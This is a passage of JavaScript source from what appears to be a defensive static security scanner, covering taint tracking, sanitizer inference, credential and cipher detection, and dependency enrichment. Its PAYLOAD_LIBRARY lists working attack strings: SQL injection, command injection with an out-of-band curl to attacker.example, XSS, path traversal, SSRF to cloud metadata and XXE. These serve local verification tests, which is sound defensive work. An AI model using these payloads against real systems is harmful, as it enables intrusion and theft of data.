        if(!v||v==='""'||v==="''"||/^(?:change.?me|your[_-]|placeholder|example|xxx+|todo|<|\$\{)/i.test(v))continue;
        if(/(?:password|secret|key|token|api)/i.test(k)){
          out.push({
            vuln:`Committed .env with Real-Looking ${k}`,
            severity:"high",cwe:"CWE-538",stride:"Information Disclosure",
            fix:`Remove ${k} from committed env files. Use .env.example with placeholders and ignore .env in VCS.`,
            code:`# In .gitignore\n.env\n\n# .env.example (commit)\n${k}=<your-${k.toLowerCase()}>`,
            file:fp,line:i+1,snippet:ln
          });
        }
      }
    }
    if(/docker-compose\.ya?ml$/i.test(base)){
      const lines=code.split("\n");
      for(let i=0;i<lines.length;i++){
        const ln=lines[i];
        const portM=ln.match(/["']?(\d{2,5}):(\d{2,5})["']?/);
        if(portM){
          const host=parseInt(portM[1],10);
          if(host===22||host===3306||host===5432||host===6379||host===27017||host===9200){
            out.push({
              vuln:`Docker Service Publishes Sensitive Port ${host} to Host`,
              severity:"high",cwe:"CWE-668",stride:"Information Disclosure",
              fix:"Bind internal databases/caches to 127.0.0.1 or keep them on the compose network only.",
              code:`# Safer:\nports:\n  - "127.0.0.1:${host}:${portM[2]}"`,
              file:fp,line:i+1,snippet:ln.trim()
            });
          }
        }
      }
    }
  }
  return out;
}

// ─── Inter-procedural sanitizer inference ───────────────────────────────────
// If a function body is essentially `return X(sanitizer(x))`, mark the function
// as a sanitizer so downstream taint checks trust it.
function inferSanitizers(fc){
  const learned={};
  const re=/function\s+(\w+)\s*\([^)]*\)\s*\{[^}]{0,600}return\s+((?:[\w.]+\s*\(){1,3})/g;
  for(const[fp,code] of Object.entries(fc)){
    let m;
    while((m=re.exec(code))!==null){
      const[,name,inner]=m;
      if(/(?:escape|sanitize|purify|DOMPurify|encodeURI|htmlspecialchars|strip_tags|bleach|escapeHtml)/i.test(inner)){
        learned[name]=(learned[name]||0)+1;
      }
    }
    // Arrow form: const safe = x => escape(x)
    const arrowRe=/(?:const|let)\s+(\w+)\s*=\s*\w+\s*=>\s*([\w.]+\s*\()/g;
    let a;
    while((a=arrowRe.exec(code))!==null){
      const[,name,call]=a;
      if(/(?:escape|sanitize|purify|DOMPurify|encodeURI|htmlspecialchars)/i.test(call)){
        learned[name]=(learned[name]||0)+1;
      }
    }
  }
  return new Set(Object.keys(learned));
}

// Apply learned sanitizers to findings: if the sink uses a value that came
// out of a sanitizer call, downgrade severity. Requires assignment form —
// `result = sanitizer(... var ...)` AND `result` appears at the sink line.
// FP-3: bare `sanitizer(... var ...);` calls (return value discarded) no
// longer cause a downgrade, since the original tainted variable still flows
// into the sink unchanged.
function applyLearnedSanitizers(findings,learned,fc){
  if(!learned.size)return findings;
  for(const f of findings){
    if(f.isSanitized)continue;
    const v=f.source?.variable;if(!v)continue;
    const fp=(f.sink?.file||f.file||"").split(" -> ").pop();
    const code=fc[fp];if(!code)continue;
    const lines=code.split("\n");
    const around=lines.slice(Math.max(0,f.sink.line-3),f.sink.line+1).join("\n");
    const sinkLine=lines[f.sink.line-1]||"";
    let downgraded=false;
    for(const s of learned){
      // Match: `<assignedVar> = <sanitizer>(... v ...)` (return is captured)
      const re=new RegExp(`\\b(\\w+)\\s*=\\s*${s}\\s*\\(\\s*[^)]*\\b${v}\\b`);
      const am=around.match(re);
      if(!am)continue;
      const assignedVar=am[1];
      // Confirm the sanitized output flows into the sink
      if(new RegExp(`\\b${assignedVar}\\b`).test(sinkLine)){
        f.isSanitized=true;
        f.sanitizerType=`Inferred sanitizer: ${s}() (return value used)`;
        f.severity="info";
        downgraded=true;
        break;
      }
    }
    if(!downgraded){
      // Log any bare-call sanitizer attempt for visibility — these used to
      // (incorrectly) cause a downgrade.
      for(const s of learned){
        if(new RegExp(`(?<![=\\w])${s}\\s*\\(\\s*[^)]*\\b${v}\\b`).test(around)
           && !new RegExp(`\\b\\w+\\s*=\\s*${s}\\s*\\(`).test(around)){
          _suppressionLog.push({vuln:'Discarded Sanitizer Call',file:fp,line:f.sink.line,
            snippet:sinkLine.trim(),reason:'sanitizer-return-discarded:'+s});
          break;
        }
      }
    }
  }
  return findings;
}

// ─── Session / cookie stored taint ──────────────────────────────────────────
// req.session.x = <tainted>  →  later res.send(req.session.x) in another handler.
function crossSessionTaint(fc){
  const writes={};
  const out=[];
  for(const[fp,code] of Object.entries(fc)){
    const re=/(?:req|ctx)\.session\s*\.\s*(\w+)\s*=\s*(?:req\.(?:body|query|params|headers)\.\w+|req\.body\b|\w+)/g;
    let m;
    while((m=re.exec(code))!==null){
      const line=code.substring(0,m.index).split("\n").length;
      writes[m[1]]=writes[m[1]]||[];
      writes[m[1]].push({file:fp,line,snippet:code.split("\n")[line-1]?.trim()||""});
    }
  }
  for(const[field,ws] of Object.entries(writes)){
    for(const[fp,code] of Object.entries(fc)){
      if(ws.some(w=>w.file===fp))continue;
      const sinkRe=new RegExp(`res\\s*\\.\\s*(?:send|write|json|render)\\s*\\([^;]{0,200}\\bsession\\.\\s*${field}\\b`,"g");
      let m;
      while((m=sinkRe.exec(code))!==null){
        const sinkLine=code.substring(0,m.index).split("\n").length;
        const lines=code.split("\n");
        const snippet=lines[sinkLine-1]?.trim()||"";
        const id=`session:${field}:${fp}:${sinkLine}`;
        out.push({
          id,
          source:{label:`Session field: ${field}`,category:"Session Taint",inputType:"session",variable:field,line:ws[0].line,file:ws[0].file,snippet:ws[0].snippet},
          sink:{type:"Stored Sink",severity:"high",vuln:"Session-Stored XSS / Second-Order Injection",cwe:"CWE-79",stride:"Tampering",line:sinkLine,file:fp,snippet,args:snippet},
          path:[
            {type:"source",label:`Session write: req.session.${field}`,line:ws[0].line,snippet:ws[0].snippet},
            {type:"propagation",label:"Persisted in session store",line:ws[0].line,snippet:""},
            {type:"sink",label:`Rendered unsanitized in ${fp.split("/").pop()}:${sinkLine}`,line:sinkLine,snippet}
          ],
          isSanitized:false,sanitizerType:null,
          severity:"high",vuln:"Session-Stored XSS / Second-Order Injection",cwe:"CWE-79",stride:"Tampering",
          file:`${ws[0].file} -> ${fp}`,isCrossFile:true,parser:"SESSION_TAINT"
        });
      }
    }
  }
  return out;
}

// ─── Sanitizer effectiveness matrix ──────────────────────────────────────────
// Maps sanitizer type → set of vuln classes it actually defeats.
const SANITIZER_EFFECTIVENESS={
  "Output Encoding":new Set(["XSS","Reflected XSS","Stored XSS","DOM XSS","XSS (Supply Chain)"]),
  "HTML Sanitizer (npm)":new Set(["XSS","Reflected XSS","Stored XSS","DOM XSS"]),
  "Python HTML Escape":new Set(["XSS","Reflected XSS"]),
  "Go HTML Escape":new Set(["XSS","Reflected XSS"]),
  "PHP HTML Encode":new Set(["XSS","Reflected XSS"]),
  "Safe DOM (text)":new Set(["XSS","DOM XSS"]),
  "Sanitized Markdown":new Set(["XSS"]),
  "Parameterized Query":new Set(["SQL Injection","SQL Injection (Template Literal)","SQL Injection (Concatenation)","SQL Injection (String Build)","NoSQL Injection"]),
  "Input Validation":new Set(["Path Traversal","IDOR","Mass Assignment","SSRF","Open Redirect","Code Injection"]),
  "Pydantic Validation":new Set(["Mass Assignment","Type Confusion","NoSQL Injection"]),
  "Django Form Validation":new Set(["Mass Assignment","Type Confusion"]),
  "Rails Strong Params":new Set(["Mass Assignment"]),
  "Spring Bean Validation":new Set(["Mass Assignment","Type Confusion"]),
  "Marshmallow Validation":new Set(["Mass Assignment","Type Confusion"]),
  "Path Normalisation":new Set(["Path Traversal"]),
  "Regex Escaping":new Set(["ReDoS"]),
  "Type Casting":new Set(["Type Confusion"]),
  "Python Type Cast":new Set(["Type Confusion"]),
  "Crypto Hash":new Set(),  // does not defeat any vuln class — present only for recognition
  "Type Guard":new Set(["Type Confusion","Mass Assignment"]),
  "JWT Algo Pinning":new Set(["JWT Algorithm Confusion"]),
  "Proto Key Filter":new Set(["Prototype Pollution"]),
};
function applySanitizerEffectiveness(findings){
  for(const f of findings){
    if(!f.isSanitized||!f.sanitizerType)continue;
    const defeats=SANITIZER_EFFECTIVENESS[f.sanitizerType];
    if(!defeats)continue;
    const vulnName=f.vuln||"";
    let defeated=false;
    for(const c of defeats)if(vulnName.includes(c)){defeated=true;break;}
    if(!defeated){
      // Sanitizer present but ineffective against this class — flip back to unsanitised with note
      f.isSanitized=false;
      f.sanitizerMismatch=f.sanitizerType;
      if(f.severity==="info")f.severity="medium";
    }else{
      f.sanitizerEffective=true;
    }
  }
  return findings;
}

// ─── Exploitability scoring ──────────────────────────────────────────────────
const SEVERITY_SCORE={critical:100,high:70,medium:40,low:20,info:5};
function scoreExploitability(f){
  let s=SEVERITY_SCORE[f.severity]??30;
  if(f.reachable===false)s*=0.55;
  if(f.routeRooted)s*=1.10;
  if(f.guards&&f.guards.length)s*=0.80;
  if(f.isSanitized)s*=0.15;
  if(f.parser==="CHAIN")s*=1.25;
  if(f.parser==="AST")s*=1.05;
  if(f.sanitizerMismatch)s*=1.15;
  if(f.evidence&&f.evidence.length>1)s*=1.10; // multiple detectors agree
  f.exploitabilityScore=Math.min(100,Math.round(s));
  if(f.exploitabilityScore>=80)f.exploitabilityLabel="High Confidence";
  else if(f.exploitabilityScore>=50)f.exploitabilityLabel="Likely";
  else if(f.exploitabilityScore>=25)f.exploitabilityLabel="Suspicious";
  else f.exploitabilityLabel="Low Confidence";
  return f;
}

// ─── Finding de-duplication with evidence merge ──────────────────────────────
function dedupeFindingsWithEvidence(findings){
  const buckets=new Map();
  for(const f of findings){
    const file=(f.source?.file||f.file||"").split(" -> ")[0];
    const key=`${file}:${f.source?.line||0}:${f.sink?.line||0}:${(f.vuln||"").replace(/\W+/g,"_").toLowerCase()}`;
    if(!buckets.has(key))buckets.set(key,f);
    const kept=buckets.get(key);
    if(!kept.evidence)kept.evidence=[kept.parser||"UNKNOWN"];
    if(f.parser&&!kept.evidence.includes(f.parser))kept.evidence.push(f.parser);
  }
  return[...buckets.values()];
}

// ─── Vulnerable-function-call depth for SCA hygiene ─────────────────────────
// For each SCA finding that names a specific vulnerable export, check whether
// that export is actually imported or invoked in the codebase.
const VULN_FUNCTION_HINTS={
  "lodash":["merge","defaultsDeep","set","setWith","zipObjectDeep"],
  "jsonwebtoken":["decode"],
  "marked":["parse"],
  "ejs":["render","renderFile","compile"],
  "node-fetch":["default"],
  "xml2js":["parseString"],
  "js-yaml":["load"],
  "minimist":["parse"],
};
function markUsedVulnFunctions(supplyChain,fc){
  const used={};
  const text=Object.values(fc).join("\n");
  for(const[pkg,fns] of Object.entries(VULN_FUNCTION_HINTS)){
    used[pkg]=new Set();
    for(const fn of fns){
      const re=new RegExp(`\\brequire\\s*\\(\\s*['"]${pkg}['"]\\s*\\)\\.${fn}\\b|\\bfrom\\s+['"]${pkg}['"]|\\b${pkg === "lodash" ? "_" : pkg.replace(/\W/g,"")}\\.${fn}\\b`);
      if(re.test(text))used[pkg].add(fn);
    }
  }
  for(const sc of supplyChain||[]){
    if(sc.type!=="vulnerable_dep")continue;
    const hints=VULN_FUNCTION_HINTS[sc.name];if(!hints)continue;
    sc.usedVulnerableFunctions=[...(used[sc.name]||[])];
    if(!sc.usedVulnerableFunctions.length)sc.noKnownCallSite=true;
  }
  return supplyChain;
}

// ─── Payload synthesis — per-vuln concrete attack strings ───────────────────
// Used by genCurls and the Playwright generator. Each entry is an array of
// {t, p} pairs: title + payload.
const PAYLOAD_LIBRARY={
  "SQL Injection":[
    {t:"Error-based Union",p:"' UNION SELECT username,password FROM users--"},
    {t:"Time-based Blind",p:"'; SELECT pg_sleep(5)--"},
    {t:"Auth Bypass",p:"admin' OR '1'='1--"},
  ],
  "NoSQL Injection":[
    {t:"Operator Injection",p:'{"$gt":""}'},
    {t:"Auth Bypass via $ne",p:'{"username":"admin","password":{"$ne":null}}'},
  ],
  "Command Injection":[
    {t:"Inline Command",p:"; cat /etc/passwd"},
    {t:"OOB Exfiltration",p:"$(curl http://attacker.example/$(whoami))"},
    {t:"Backtick",p:"`id`"},
  ],
  "XSS":[
    {t:"Reflective Alert",p:"\"><script>alert(document.domain)<\/script>"},
    {t:"Attribute Break",p:"\" autofocus onfocus=alert(1) x=\""},
    {t:"SVG Onload",p:"<svg/onload=alert(1)>"},
  ],
  "Path Traversal":[
    {t:"Linux /etc/passwd",p:"../../../../../../etc/passwd"},
    {t:"URL-Encoded",p:"%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
    {t:"Double-Encoded",p:"%252e%252e%252fetc%252fpasswd"},
  ],
  "SSRF":[
    {t:"AWS IMDSv1",p:"http://169.254.169.254/latest/meta-data/iam/"},
    {t:"GCP Metadata",p:"http://metadata.google.internal/computeMetadata/v1/"},
    {t:"Localhost",p:"http://127.0.0.1:22/"},
  ],
  "Open Redirect":[
    {t:"Direct",p:"https://attacker.example/"},
    {t:"Protocol-Relative",p:"//attacker.example/"},
    {t:"Data URI",p:"data:text/html,<script>alert(1)<\/script>"},
  ],
  "Mass Assignment":[
    {t:"isAdmin Flag",p:'{"isAdmin":true,"role":"admin"}'},
  ],
  "IDOR":[
    {t:"Sequential ID",p:"OTHER_USER_ID"},
    {t:"Negative ID",p:"-1"},
  ],
  "Prototype Pollution":[
    {t:"Pollute Object.prototype",p:'{"__proto__":{"isAdmin":true}}'},
    {t:"Constructor Proto",p:'{"constructor":{"prototype":{"polluted":true}}}'},
  ],
  "SSTI":[
    {t:"Jinja2",p:"{{7*7}}"},
    {t:"Handlebars",p:"{{#with \"s\" as |string|}}{{string.constructor.prototype}}{{/with}}"},
  ],
  "XXE":[
    {t:"File Read",p:'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>'},
  ],
  "JWT Algorithm Confusion":[
    {t:"Alg None",p:"eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."},
  ],
  "ReDoS":[
    {t:"Catastrophic Backtrack",p:"a".repeat(40)+"!"},
  ],
  "OAuth CSRF":[
    {t:"Forged Code Callback",p:"?code=attacker_supplied_code&state=victim_state"},
  ],
  "Race Condition":[
    {t:"Concurrent Double-Spend",p:"<parallel POST x50 with same body>"},
  ],
  "Timing Oracle":[
    {t:"Timing Measurement",p:"<send 100 requests, measure ns-level variance>"},
  ],
};
function payloadsForFinding(vuln){
  if(!vuln)return null;
  for(const[k,v] of Object.entries(PAYLOAD_LIBRARY))if(vuln.includes(k))return v;
  return null;
}

// ─── Proof obligation generator ──────────────────────────────────────────────
// Given a finding, emit a minimal test the user can run to confirm.
function buildProofObligation(f,route){
  const pl=payloadsForFinding(f.vuln);
  if(!pl)return null;
  const host="http://localhost:3000";
  const path=route?.path||"/api/endpoint";
  const method=(route?.method||"POST").toLowerCase();
  const param=f.source?.variable||"input";
  const expected=(()=>{
    if(f.vuln?.includes("SQL"))return "status ≠ 500 AND response does not echo SQL error text";
    if(f.vuln?.includes("XSS"))return `response body should not contain literal string "${pl[0].p}"`;
    if(f.vuln?.includes("Path Traversal"))return "response must not contain root:x: (indicates /etc/passwd read)";
    if(f.vuln?.includes("SSRF"))return "server must not reach 169.254.169.254 (check outbound logs)";
    if(f.vuln?.includes("IDOR"))return "response must not return records owned by a different user";
    if(f.vuln?.includes("Mass Assignment"))return "user.isAdmin must remain false after request";
    if(f.vuln?.includes("Prototype Pollution"))return "({}).isAdmin must remain undefined after request";
    return "route returns 4xx rejecting the payload";
  })();
  return{
    method:method.toUpperCase(),
    url:`${host}${path}`,
    payload:pl[0].p,
    parameter:param,
    expected,
    obligation:`POST ${path} with ${param}=${pl[0].p} — ${expected}`
  };
}

const CIPHER_REST_PATTERNS=[
  // Node.js crypto — explicit ciphers
  {regex:/crypto\.createCipheriv\s*\(\s*['"]([^'"]+)['"]/g,getLabel:m=>m[1],ctx:"Node.js createCipheriv"},
  {regex:/crypto\.createCipher\s*\(\s*['"]([^'"]+)['"]/g,getLabel:m=>m[1],ctx:"Node.js createCipher (legacy)"},
  // Node.js crypto — hash / HMAC
  {regex:/crypto\.createHash\s*\(\s*['"]([^'"]+)['"]/g,getLabel:m=>m[1],ctx:"Node.js createHash"},
  {regex:/crypto\.createHmac\s*\(\s*['"]([^'"]+)['"]/g,getLabel:m=>m[1],ctx:"Node.js createHmac"},
  // Node.js key derivation
  {regex:/(?:bcrypt|bcryptjs)\.(?:hash|genSalt|compare)\s*\(/g,getLabel:()=>"bcrypt",ctx:"bcrypt KDF"},
  {regex:/argon2\.(?:hash|verify)\s*\(/g,getLabel:()=>"Argon2",ctx:"Argon2 KDF"},
  {regex:/crypto\.scrypt\s*\(/g,getLabel:()=>"scrypt",ctx:"Node.js scrypt"},
  {regex:/crypto\.pbkdf2\s*\(/g,getLabel:()=>"PBKDF2",ctx:"Node.js pbkdf2"},
  // JWT signing algorithm
  {regex:/(?:algorithm|alg)\s*:\s*['"]([A-Z]{2}\d{3})['"]/g,getLabel:m=>m[1],ctx:"JWT algorithm"},
  {regex:/jwt\.sign\s*\([^)]*algorithm\s*:\s*['"]([^'"]+)['"]/g,getLabel:m=>m[1],ctx:"JWT sign"},
  // Java JCE
  {regex:/Cipher\.getInstance\s*\(\s*['"]([^'"]+)['"]/g,getLabel:m=>m[1],ctx:"Java JCE Cipher"},
  {regex:/MessageDigest\.getInstance\s*\(\s*['"]([^'"]+)['"]/g,getLabel:m=>m[1],ctx:"Java MessageDigest"},
  // Python
  {regex:/hashlib\.(md5|sha1|sha224|sha256|sha384|sha512|sha3_256|sha3_512|blake2b|blake2s)\s*\(/gi,getLabel:m=>m[1].toUpperCase(),ctx:"Python hashlib"},
  {regex:/algorithms\.(AES|TripleDES|Blowfish|CAST5|ChaCha20|Camellia|ARC4)\s*\(/g,getLabel:m=>m[1],ctx:"Python cryptography"},
  {regex:/hashes\.(SHA1|SHA224|SHA256|SHA384|SHA512|MD5|SHA3_256|Blake2b)\s*\(/g,getLabel:m=>m[1],ctx:"Python cryptography hashes"},
  {regex:/AES\.MODE_(CBC|ECB|GCM|CTR|CFB|OFB|SIV|CCM|EAX)\b/g,getLabel:m=>`AES-${m[1]}`,ctx:"Python PyCryptodome"},
  // PHP
  {regex:/password_hash\s*\([^,]+,\s*(PASSWORD_\w+)/g,getLabel:m=>m[1],ctx:"PHP password_hash"},
  {regex:/openssl_encrypt\s*\([^,]+,\s*['"]([^'"]+)['"]/g,getLabel:m=>m[1],ctx:"PHP openssl_encrypt"},
  // Ruby
  {regex:/OpenSSL::Cipher(?:\.new)?\s*\(\s*['"]([^'"]+)['"]/g,getLabel:m=>m[1],ctx:"Ruby OpenSSL::Cipher"},
  {regex:/OpenSSL::Digest(?:\.new)?\s*\(\s*['"]([^'"]+)['"]/g,getLabel:m=>m[1],ctx:"Ruby OpenSSL::Digest"},
  {regex:/BCrypt::Password\.create\s*\(/g,getLabel:()=>"bcrypt",ctx:"Ruby BCrypt"},
  // .NET
  {regex:/new\s+(AesManaged|AesCryptoServiceProvider|DESCryptoServiceProvider|TripleDESCryptoServiceProvider|RijndaelManaged|SHA256Managed|SHA512Managed|MD5CryptoServiceProvider|HMACSHA256|HMACSHA512)\s*\(/g,getLabel:m=>m[1],ctx:".NET crypto"},
  {regex:/\b(Aes|SHA256|SHA512|SHA384|MD5)\.Create\s*\(\s*\)/g,getLabel:m=>m[1],ctx:".NET crypto factory"},
  // Generic config cipher name
  {regex:/(?:algorithm|cipher|encryption_algorithm)\s*[=:]\s*['"]((aes|des|3des|tripledes|rc4|blowfish|chacha20|camellia|twofish|cast|rabbit|salsa20)[^'"]{0,20})['"]/gi,getLabel:m=>m[1],ctx:"Config value"},
];
const CIPHER_TRANSIT_PATTERNS=[
  // Node.js HTTPS / TLS server creation
  {regex:/https\.createServer\s*\(/g,getLabel:()=>"HTTPS Server",ctx:"Node.js https"},
  {regex:/tls\.createServer\s*\(/g,getLabel:()=>"TLS Server",ctx:"Node.js tls"},
  // TLS cert loaded from file (TLS in use)
  {regex:/(?:cert|key)\s*:\s*fs\.readFileSync\s*\(/g,getLabel:()=>"TLS Certificate (file-based)",ctx:"Node.js TLS cert"},
  // Explicit TLS options
  {regex:/secureProtocol\s*:\s*['"]([^'"]+)['"]/g,getLabel:m=>m[1],ctx:"Node.js secureProtocol"},
  {regex:/minVersion\s*:\s*['"]([^'"]+)['"]/g,getLabel:m=>m[1],ctx:"Node.js tls minVersion"},
  {regex:/ciphers\s*:\s*['"]([^'"]{5,})['"]/g,getLabel:m=>m[1],ctx:"Node.js tls ciphers"},
  // nginx
  {regex:/ssl_protocols\s+([^;]+);/g,getLabel:m=>m[1].trim(),ctx:"nginx ssl_protocols"},
  {regex:/ssl_ciphers\s+['"]?([A-Za-z0-9:!\-+@,\s]+?)['"]?\s*;/g,getLabel:m=>m[1].trim(),ctx:"nginx ssl_ciphers"},
  // Apache
  {regex:/SSLProtocol\s+([^\r\n]+)/g,getLabel:m=>m[1].trim(),ctx:"Apache SSLProtocol"},
  {regex:/SSLCipherSuite\s+([^\r\n]+)/g,getLabel:m=>m[1].trim(),ctx:"Apache SSLCipherSuite"},
  // Python ssl
  {regex:/ssl\.SSLContext\s*\(/g,getLabel:()=>"Python ssl.SSLContext",ctx:"Python ssl"},
  {regex:/ssl\.wrap_socket\s*\(/g,getLabel:()=>"Python ssl.wrap_socket",ctx:"Python ssl"},
  {regex:/ssl\.PROTOCOL_(TLS\w*|SSLv\d\w*)/g,getLabel:m=>m[1].replace(/_/g,"."),ctx:"Python ssl protocol"},
  // Django / Flask HTTPS
  {regex:/SECURE_SSL_REDIRECT\s*=\s*True/g,getLabel:()=>"Django SECURE_SSL_REDIRECT",ctx:"Django settings"},
  {regex:/SESSION_COOKIE_SECURE\s*=\s*True/g,getLabel:()=>"Django SESSION_COOKIE_SECURE",ctx:"Django settings"},
  {regex:/ssl_context\s*=/g,getLabel:()=>"Flask ssl_context",ctx:"Flask/Python SSL"},
  // Go TLS
  {regex:/tls\.Config\s*\{/g,getLabel:()=>"Go tls.Config",ctx:"Go tls"},
  {regex:/MinVersion\s*:\s*tls\.(VersionTLS\d+)/g,getLabel:m=>"MinVersion: "+m[1].replace("VersionTLS","TLS "),ctx:"Go tls.Config"},
  {regex:/tls\.(VersionTLS\d+)/g,getLabel:m=>m[1].replace("VersionTLS","TLS "),ctx:"Go tls version"},
  // Java
  {regex:/SSLContext\.getInstance\s*\(\s*['"]([^'"]+)['"]/g,getLabel:m=>m[1],ctx:"Java SSLContext"},
  // Ruby
  {regex:/ssl_version\s*=\s*['"]([^'"]+)['"]/g,getLabel:m=>m[1],ctx:"Ruby ssl_version"},
  {regex:/OpenSSL::SSL::SSLContext\.new/g,getLabel:()=>"Ruby OpenSSL::SSL::SSLContext",ctx:"Ruby ssl"},
];
function classifyCipherStrength(cipher){const c=cipher.toUpperCase();if(/\bRC4\b|\bRC2\b|\bARCFOUR\b|SSLV2|SSLV3|\bNULL\b|\bEXPORT\b|\bANULL\b|\bENULL\b|\bECB\b|\bMD5\b|\bSHA1\b(?![\d_])/.test(c))return"weak";if(/\bDES\b/.test(c)&&!/3DES|EDE|TRIPLE/.test(c))return"weak";if(/3DES|TRIPLE.?DES|DES.EDE|TLS.?1.?1|TLSV1\.1/.test(c))return"weak";if(/BCRYPT|ARGON2|SCRYPT|PBKDF2|FERNET|CHACHA20|CHACHAPOLY|PASSWORD_BCRYPT|PASSWORD_ARGON/.test(c))return"strong";if(/\bAES\b|SHA256|SHA384|SHA512|SHA3|BLAKE2|HMACSHA256|HMACSHA512|\bGCM\b|\bCCM\b|ECDHE|DHE|TLS.?1.?[23]|TLSV1\.[23]|HTTPS.SERVER|TLS.SERVER|TLS.CERTIF|HS256|RS256|ES256/.test(c))return"strong";return"unknown";}
function scanCiphers(fp,raw){const cleaned=stripNoise(raw);const lines=raw.split("\n");const atRest=[],inTransit=[];for(const pat of CIPHER_REST_PATTERNS){const re=new RegExp(pat.regex.source,pat.regex.flags);let m;while((m=re.exec(cleaned))){const line=lineAt(cleaned,m.index);const cipher=pat.getLabel(m);atRest.push({cipher,strength:classifyCipherStrength(cipher),ctx:pat.ctx,file:fp,line,snippet:(lines[line-1]||"").trim()});}}for(const pat of CIPHER_TRANSIT_PATTERNS){const re=new RegExp(pat.regex.source,pat.regex.flags);let m;while((m=re.exec(cleaned))){const line=lineAt(cleaned,m.index);const cipher=pat.getLabel(m);inTransit.push({cipher,strength:classifyCipherStrength(cipher),ctx:pat.ctx,file:fp,line,snippet:(lines[line-1]||"").trim()});}}const uniq=(a)=>a.filter((v,i,arr)=>arr.findIndex(x=>x.cipher===v.cipher&&x.file===v.file&&x.line===v.line)===i);return{atRest:uniq(atRest),inTransit:uniq(inTransit)};}

function scanCredentials(fp,raw){
  if(!CRED_PREFILTER.test(raw))return[];
  const lines=raw.split("\n");const results=[];const seen=new Set();
  for(const pat of CREDENTIAL_PATTERNS){
    let re;try{re=new RegExp(pat.r,pat.flags||"gi");}catch(_){continue;}
    re.lastIndex=0;let m;
    while((m=re.exec(raw))!=null){
      const val=m[0];
      if(/placeholder|example|xxx+|your_|changeme|<[A-Z_]+>|MY_|INSERT_|REPLACE_|TODO|test_key|fake_|sample_|dummy_/i.test(val))continue;
      const line=raw.substring(0,m.index).split("\n").length;
      const snippet=lines[line-1]?.trim()||"";
      // Per-pattern line-context gate: if ctx is set, the matched line must satisfy it
      if(pat.ctx&&!pat.ctx.test(snippet))continue;
      if(pat.n==="Password in URL"&&/localhost|127\.0\.|0\.0\.0\.0|example\.com|test\.com|::1|user:pass|admin:admin|foo:bar|user:password|username:password|admin:password|root:password|test:test|john:doe|demo:demo|myuser:mypass|guest:guest/i.test(val))continue;
      const key=`${fp}:${line}:${pat.n}`;
      if(seen.has(key))continue;seen.add(key);
      const severity=pat.s==="c"?"critical":pat.s==="h"?"high":"medium";
      const masked=val.length>12?val.substring(0,6)+"••••••"+val.substring(val.length-4):val.substring(0,3)+"•••";
      results.push({vuln:pat.n,severity,cwe:"CWE-798",stride:"Information Disclosure",file:fp,line,snippet,masked,fix:"Remove the hardcoded credential. Store secrets in environment variables or a secrets manager (AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager). Rotate the exposed credential immediately, treat it as compromised.",code:`// Remove hardcoded value:\n// const secret = "${masked}";\n\n// Use environment variable instead:\nconst secret = process.env.${pat.n.toUpperCase().replace(/[^A-Z0-9]/g,"_")};`});
    }
  }
  return results;
}

/* ── OSV-backed SCA Engine ───────────────────────────────────────────────── */

function _osvCacheGet(key){try{const r=sessionStorage.getItem('osv_'+key);return r?JSON.parse(r):null;}catch(_){return null;}}
function _osvCacheSet(key,val){try{sessionStorage.setItem('osv_'+key,JSON.stringify(val));}catch(_){}}

// Feat-9: EPSS (Exploit Prediction Scoring System) overlay. Fetches probability
// of exploitation in the next 30 days per CVE; caches on disk. When offline or
// the API errors, falls back to null fields — never blocks the scan.
async function _fetchEPSS(cveId){
  if (!cveId || !/^CVE-\d{4}-\d+$/i.test(cveId)) return null;
  if (process.env.AGENTIC_SECURITY_OFFLINE === '1') return null;
  const cached = _osvCacheGet('epss:'+cveId);
  if (cached !== null) return cached;
  try {
    const res = await fetch(`https://api.first.org/data/v1/epss?cve=${encodeURIComponent(cveId)}`, {
      headers: { 'User-Agent': 'agentic-security/0.1' },
    });
    if (!res.ok) { _osvCacheSet('epss:'+cveId, false); return null; }
    const j = await res.json();
    const row = j.data?.[0];
    const out = row ? { score: parseFloat(row.epss), percentile: parseFloat(row.percentile) } : null;
    _osvCacheSet('epss:'+cveId, out || false);
    return out;
  } catch { return null; }
}

async function _enrichWithEPSS(supplyChainResults){
  const out = supplyChainResults;
  const cves = new Set();
  for (const r of out) for (const a of (r.cveAliases || [])) if (/^CVE-/.test(a)) cves.add(a);
  // Fetch in parallel, deduped per CVE
  const epssByCve = new Map();
  await Promise.all([...cves].map(async (cve) => {
    const epss = await _fetchEPSS(cve);
    if (epss) epssByCve.set(cve, epss);
  }));
  for (const r of out) {
    const cve = (r.cveAliases || []).find(a => /^CVE-/.test(a));
    const epss = cve ? epssByCve.get(cve) : null;
    if (epss) {
      r.epssScore = epss.score;
      r.epssPercentile = epss.percentile;
    } else {
      r.epssScore = null;
      r.epssPercentile = null;
    }
  }
  return out;
}

function _makePurl(ecosystem,name,version,group){
  const t={npm:'npm',pypi:'pypi'}[ecosystem]||ecosystem;
  if(!t)return'';
  const ns=group?`${encodeURIComponent(group)}/`:'';
  return`pkg:${t}/${ns}${encodeURIComponent(name)}${version?'@'+version:''}`;
}

function _parsePackageJson(text,filePath){
  const out=[];try{const d=JSON.parse(text);
    for(const[depKey,scope]of[['dependencies','required'],['devDependencies','optional']]){
      for(const[name,verRange]of Object.entries(d[depKey]||{})){
        const ver=verRange.replace(/^[\^~>=<\s*]+/,'').split(/\s/)[0]||verRange;
        const scoped=name.startsWith('@');
        const parts=scoped?name.slice(1).split('/'):['',name];
        const group=scoped?`@${parts[0]}`:'';
        const pkgName=scoped?parts[1]:name;
        out.push({name,version:ver,group,scope,purl:_makePurl('npm',pkgName,ver,group),ecosystem:'npm',filePath,
          isUnpinned:verRange==='*'||verRange==='latest'||verRange===''||verRange==='>=0.0.0'});
      }
    }
  }catch(_){}return out;
}

function _parsePackageLockJson(text,filePath){
  const out=[];try{const d=JSON.parse(text);
    const packages=d.packages||d.dependencies||{};
    for(const[path,info]of Object.entries(packages)){
      if(!path||typeof info!=='object')continue;
      const name=info.name||path.split('node_modules/').pop();
      const ver=info.version||'';
      if(!name||!ver)continue;
      const scoped=name.startsWith('@');
      const parts=scoped?name.slice(1).split('/'):['',name];
      const group=scoped?`@${parts[0]}`:'';
      const pkgName=scoped?parts[1]:name;
      out.push({name,version:ver,group,scope:info.dev?'optional':'required',
        purl:_makePurl('npm',pkgName,ver,group),ecosystem:'npm',filePath,isUnpinned:false});
    }
  }catch(_){}return out;
}

